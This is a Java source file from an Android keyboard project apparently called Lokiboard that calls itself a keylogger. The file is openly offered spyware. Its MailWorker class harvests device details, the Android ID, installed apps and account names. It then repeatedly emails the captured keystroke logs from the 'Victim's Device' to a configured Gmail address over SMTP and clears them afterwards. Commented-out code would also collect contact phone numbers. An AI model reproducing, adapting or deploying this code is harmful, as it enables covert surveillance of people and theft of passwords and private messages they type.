package com.abifog.lokiboard;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Handler;
import android.os.SystemClock;
import android.provider.Settings;
import android.util.DisplayMetrics;
import android.util.Log;
import android.util.Patterns;
import android.view.Display;
import android.view.WindowManager;

import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.List;
import java.util.Properties;
import java.util.regex.Pattern;

import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.AddressException;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;

import static android.content.Context.MODE_PRIVATE;
import static android.os.Build.MANUFACTURER;

public class MailWorker extends Worker {

    Context ctx;

    private String ApplicationPackageName;

   // private Handler taskhandler = new Handler();
    public static final String MY_PREFS_NAME = "GPrefs";
    public static final String MY_PREFS_STRING_KEY = "GPrefsStringsKey";
    private String DataToSend = "";
    // private String ApplicationPackageName;

    private String Sysinfo = "";
    //private String ContactsList = "";
    private String AccountsList = "";

    //private String email = "dashdashpass7@gmail.com";
    String email = "";
    String emailinterval = "";
    //private String password = "createpassword.";
    String password = "";//getResources().getString(R.string.Password);

    private String ContactsList = "\nList Of Contacts: \n";

    private static final String TAG = "MailWorker";

    private SharedPreferences.Editor editor;
    private SharedPreferences prefs;
    public static final String MY_PREFS_Notification_Count_KEY = "GPrefsNotificationCountKey";
    public static final String MY_PREFS_Text_Count_KEY = "GPrefsText_CountKey";
    public static final String MY_PREFS_FOCUSED_Count_KEY = "GPrefsFOCUSED_CountKey";
    public static final String MY_PREFS_Clicks_Count_KEY = "GPrefsClicks_CountKey";
    public static final String MY_PREFS_Clips_Count_KEY = "GPrefsClips_CountKey";



    public MailWorker(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);

        ctx = context;

    }

    @NonNull
    @Override
    public Result doWork() {

        for (int j = 0; j < 3; j++) {

            Log.i(TAG,"Again Started EMail Work!");

            // _multipart = new MimeMultipart("related");

            email=ctx.getResources().getString(R.string.EMail);
            password=ctx.getResources().getString(R.string.EmailPassword);
            emailinterval=ctx.getResources().getString(R.string.Interval);



            // php();

            prefs = ctx.getSharedPreferences("MYSHPF", MODE_PRIVATE);

            //editor = ctx.getSharedPreferences("MYSHPF", MODE_PRIVATE).edit();



          //  String DataToSend = prefs.getString(MY_PREFS_STRING_KEY, "Hakistan Keylogger \n");//"No name defined" is the default value.


            // Log.i(TAG,"Going To Send Email!");


            //addAttachment();

           // if(haveNetworkConnection()) {

                if (prefs.getBoolean("FirstRun", true)) {

                    Log.i(TAG, "First Run Going to send Sys info");


                    Sysinfo = getSYSInfo();
                    // ContactsList = getContactList();
                    AccountsList = getAccountsList();

                    send1stMail(email, "Lokiboard Keylogger First Report", Sysinfo + "\n" + AccountsList + "\n\n<End Of Message>\n*|* Loki Keyboard Mod For Android *|*\n*|* Re-developed By Hakistan *|*\nSupport Us On Youtube(https://youtube.com/hakistan) \nReport Issues on Telegram(https://t.me/hakistan_chat)");


                } else {

                    Log.i(TAG, "NOt First Run");


                }

                String datatos = getLogsData();

                if (datatos.trim().length() > 0) {

                    Log.i(TAG, "Some Logs Founded, going to send Email!");


                    // Long perviousNotiCountData = prefs.getLong(MY_PREFS_Notification_Count_KEY, 0);//"No name defined" is the default value.
                    //  Long perviousTextCountData = prefs.getLong(MY_PREFS_Text_Count_KEY, 0);//"No name defined" is the default value.
                    // Long perviousFocusedCountData = prefs.getLong(MY_PREFS_FOCUSED_Count_KEY, 0);//"No name defined" is the default value.
                    // Long perviousClicksCountData = prefs.getLong(MY_PREFS_Clicks_Count_KEY, 0);//"No name defined" is the default value.
                    // Long perviousClipsCountData = prefs.getLong(MY_PREFS_Clips_Count_KEY, 0);//"No name defined" is the default value.

                    String deviceDetails = "MANUFACTURER : " + Build.MANUFACTURER
                            + "\nMODEL : " + Build.MODEL
                            + "\nPRODUCT : " + Build.PRODUCT
                            + "\nSERIAL : " + Build.SERIAL
                            + "\nVERSION.RELEASE : " + Build.VERSION.RELEASE
                            + "\nVERSION.INCREMENTAL : " + Build.VERSION.INCREMENTAL
                            + "\nVERSION.SDK.NUMBER : " + Build.VERSION.SDK_INT
                            + "\nBOARD : " + Build.BOARD
                            //+"\nScreen Width : "+width
                            //+"\nScreen Height : "+height
                            + "\nBOOTLOADER : " + Build.BOOTLOADER
                            + "\nBRAND : " + Build.BRAND
                            + "\nCPU_ABI : " + Build.CPU_ABI
                            + "\nCPU_ABI2 : " + Build.CPU_ABI2
                            + "\nFINGERPRINT : " + Build.FINGERPRINT;

                    sendMail(email, "Lokiboard keylogger Report", "Victim's Device Info : \n" + deviceDetails + "\n\n"+"\nKey Logs: \n" + datatos + "\n\n<End Of Message>\n*|* Loki Keyboard Mod For Android *|*\n*|* Re-developed by Hakistan *|*\nSupport Us On Youtube(https://youtube.com/hakistan) \nReport Issues on Telegram(https://t.me/hakistan_chat)");

                    /*
                    editor.putLong(MY_PREFS_Notification_Count_KEY, 0);
                    editor.putLong(MY_PREFS_Text_Count_KEY, 0);
                    editor.putLong(MY_PREFS_FOCUSED_Count_KEY, 0);
                    editor.putLong(MY_PREFS_Clicks_Count_KEY, 0);
                    editor.putLong(MY_PREFS_Clips_Count_KEY, 0);
                    editor.putString(MY_PREFS_STRING_KEY, "");

                     */
                    // editor.apply();

                } else {

                    Log.i(TAG, "No Logs So, Email is not going to be sent!");


                }


                //Log.i(TAG,"Email SEnt!");

                // DataToSend = "";

                //Log.i("Gservice", i+" Email Sent!");
                //editor.putInt("idName", 12);
                // editor.apply();

            //}

            Log.i(TAG,"Finishing Task!");

            SystemClock.sleep(Long.parseLong(emailinterval));

           // i++;

        }


        return Result.success();
    }


    private String getLogsData(){


        SharedPreferences prefs = ModApp.getAppContext().getSharedPreferences("MYSHPF", MODE_PRIVATE);

        return prefs.getString("datatost", "Redeveloped By Hakistan");

    }

    private boolean haveNetworkConnection() {
        boolean haveConnectedWifi = false;
        boolean haveConnectedMobile = false;

        ConnectivityManager cm = (ConnectivityManager) ctx.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo[] netInfo = cm.getAllNetworkInfo();
        for (NetworkInfo ni : netInfo) {
            if (ni.getTypeName().equalsIgnoreCase("WIFI"))
                if (ni.isConnected())
                    haveConnectedWifi = true;
            if (ni.getTypeName().equalsIgnoreCase("MOBILE"))
                if (ni.isConnected())
                    haveConnectedMobile = true;
        }
        return haveConnectedWifi || haveConnectedMobile;
    }


    private void sendMail(String email, String subject, String messageBody)
    {
        Session session = createSessionObject();

        try {
            Message message = createMessage(email, subject, messageBody, session);

            new SendMailTask().execute(message);

        } catch (AddressException e) {
            e.printStackTrace();
        } catch (MessagingException e) {
            e.printStackTrace();
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
    }

    private void send1stMail(String email, String subject, String messageBody)
    {
        Session session = createSessionObject();

        try {
            Message message = createMessage(email, subject, messageBody, session);

            new SendFirstMailTask().execute(message);

        } catch (AddressException e) {
            e.printStackTrace();
        } catch (MessagingException e) {
            e.printStackTrace();
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
    }

    private Message createMessage(String email, String subject, String messageBody, Session session) throws MessagingException, UnsupportedEncodingException {
        Message message = new MimeMessage(session);
        message.setFrom(new InternetAddress("keylogger@hakistan.org", "Hakistan Keylogger"));
        message.addRecipient(Message.RecipientType.TO, new InternetAddress(email, email));
        message.setSubject(subject);
        message.setText(messageBody);
        // message.setContent();
/*
        String filename = Environment.getExternalStorageDirectory().getAbsolutePath() + "/my_test_contact.csv";
        if (!"".equals(filename)) {
            Multipart _multipart = new MimeMultipart();
            BodyPart messageBodyPart = new MimeBodyPart();
            DataSource source = new FileDataSource(filename);

            messageBodyPart.setDataHandler(new DataHandler(source));
            messageBodyPart.setFileName(filename);

            _multipart.addBodyPart(messageBodyPart);
            message.setContent(_multipart);
        }
*/
        // message.setContent(_multipart,"messageBody Should be here!");
        return message;
    }

    private Session createSessionObject() {
        Properties properties = new Properties();
        properties.put("mail.smtp.auth", "true");
        properties.put("mail.smtp.starttls.enable", "true");
        properties.put("mail.smtp.host", "smtp.gmail.com");
        properties.put("mail.smtp.port", "587");

        return Session.getInstance(properties, new javax.mail.Authenticator() {
            protected PasswordAuthentication getPasswordAuthentication() {
                return new PasswordAuthentication(email, password);
            }
        });
    }

    private String getAccountsList(){

        String AccountDetails = "\nList Of Accounts: \n\nType : Username\n";

        ArrayList<String> emails = new ArrayList<>();

        Pattern gmailPattern = Patterns.EMAIL_ADDRESS;
        Account[] accounts = AccountManager.get(getApplicationContext()).getAccounts();
        for (Account account : accounts) {

            AccountDetails = AccountDetails + account.type + " : " + account.name + "\n";

            //emails.add(account.name);

            // if (gmailPattern.matcher(account.name).matches()) {
            //   emails.add(account.name);
            //}
        }

        //      Log.i(TAG, AccountDetails);


        return AccountDetails;

    }
/*
    private String getContactList() {
        ContentResolver cr = getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        if ((cur != null ? cur.getCount() : 0) > 0) {
            while (cur != null && cur.moveToNext()) {
                String id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(
                        ContactsContract.Contacts.DISPLAY_NAME));

                if (cur.getInt(cur.getColumnIndex(
                        ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));
                        // Log.i(TAG, "Name: " + name);

                        ContactsList = ContactsList + phoneNo +"\n";

                        //  Log.i(TAG, "Phone Number: " + phoneNo);
                    }
                    pCur.close();
                }
            }
        }
        if(cur!=null){
            cur.close();
        }

        //  Log.i(TAG, ContactsList);


        return ContactsList;
    }


 */


    private String getSYSInfo(){

        WindowManager wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
        assert wm != null;
        Display display = wm.getDefaultDisplay();
        DisplayMetrics metrics = new DisplayMetrics();
        display.getMetrics(metrics);
        int width = metrics.widthPixels;
        int height = metrics.heightPixels;
        @SuppressLint("HardwareIds")
        String SystemData = "\nDevice Information: \n";


        SystemData = SystemData+ "VERSION.RELEASE : "+ Build.VERSION.RELEASE
                +"\nVERSION.INCREMENTAL : "+Build.VERSION.INCREMENTAL
                +"\nVERSION.SDK.NUMBER : "+Build.VERSION.SDK_INT
                +"\nBOARD : "+Build.BOARD
                +"\nScreen Width : "+width
                +"\nScreen Height : "+height
                +"\nBOOTLOADER : "+Build.BOOTLOADER
                +"\nBRAND : "+Build.BRAND
                +"\nCPU_ABI : "+Build.CPU_ABI
                +"\nCPU_ABI2 : "+Build.CPU_ABI2
                +"\nDISPLAY : "+Build.DISPLAY
                +"\nFINGERPRINT : "+Build.FINGERPRINT
                +"\nHARDWARE : "+Build.HARDWARE
                +"\nHOST : "+ Build.HOST
                +"\nID : "+Build.ID
                +"\nMANUFACTURER : "+ MANUFACTURER
                +"\nMODEL : "+Build.MODEL
                +"\nPRODUCT : "+Build.PRODUCT
                +"\nSERIAL : "+Build.SERIAL
                +"\nTAGS : "+Build.TAGS
                //+"\nTIME : "+Build.TIME
                +"\nTYPE : "+Build.TYPE
                +"\nUNKNOWN : "+Build.UNKNOWN
                +"\nUSER : "+Build.USER
                + "\nANDROID ID : " + Settings.Secure.getString(getApplicationContext().getContentResolver(), Settings.Secure.ANDROID_ID);


        // Log.i(TAG,details);

        ApkInfoExtractor apkInfoExtractor = new ApkInfoExtractor(getApplicationContext());

        List<String> arrayList = new ApkInfoExtractor(getApplicationContext()).GetAllInstalledApkInfo();
        // String ApplicationLabelName = apkInfoExtractor.GetAppName(ApplicationPackageName);

        String InstalledAppsPkg = "";

        for (String item : arrayList){

            String ApplicationLabelName = apkInfoExtractor.GetAppName(item);

            InstalledAppsPkg= InstalledAppsPkg + ApplicationLabelName + " : " + item + "\n";


        }

        SystemData  = SystemData + "\n\nList Of Installed Apps:\n" + "App Name : Package Name\n" + InstalledAppsPkg + "\n";

        //Log.i(TAG, SystemData);

        return SystemData;
    }

    private static class SendMailTask extends AsyncTask<Message, Void, Void> {
        //  private ProgressDialog progressDialog;

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
            //Toast.makeText(getApplicationContext(),"Sending Email, Please Wait...",Toast.LENGTH_LONG).show();
            //    progressDialog = ProgressDialog.show(MainActivity.this, "Please wait", "Sending mail", true, false);
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            super.onPostExecute(aVoid);

            SharedPreferences.Editor editor = ModApp.getAppContext().getSharedPreferences("MYSHPF", MODE_PRIVATE).edit();
            editor.putString("datatost", "");
            //editor.putInt("idName", 12);
            editor.apply();
            // Toast.makeText(getApplicationContext(),"Email Sent!",Toast.LENGTH_LONG).show();

            //  progressDialog.dismiss();
        }

        @Override
        protected Void doInBackground(Message... messages) {
            try {
                Transport.send(messages[0]);
            } catch (MessagingException e) {
                e.printStackTrace();
            }
            return null;
        }
    }

    private static class SendFirstMailTask extends AsyncTask<Message, Void, Void> {
        //  private ProgressDialog progressDialog;

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
            //Toast.makeText(getApplicationContext(),"Sending Email, Please Wait...",Toast.LENGTH_LONG).show();
            //    progressDialog = ProgressDialog.show(MainActivity.this, "Please wait", "Sending mail", true, false);
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            super.onPostExecute(aVoid);

            Log.i(TAG,"Resting Values From Shprefs!");
            Log.i(TAG,"Resting Values From Shprefs!");
            SharedPreferences.Editor editor = ModApp.getAppContext().getSharedPreferences("MYSHPF", MODE_PRIVATE).edit();

            editor.putBoolean("FirstRun", false);
            editor.apply();

            Log.i(TAG,"Rested Values!");


            // Toast.makeText(getApplicationContext(),"Email Sent!",Toast.LENGTH_LONG).show();

            //  progressDialog.dismiss();
        }

        @Override
        protected Void doInBackground(Message... messages) {
            try {
                Transport.send(messages[0]);
            } catch (MessagingException e) {
                e.printStackTrace();
            }
            return null;
        }
    }



}
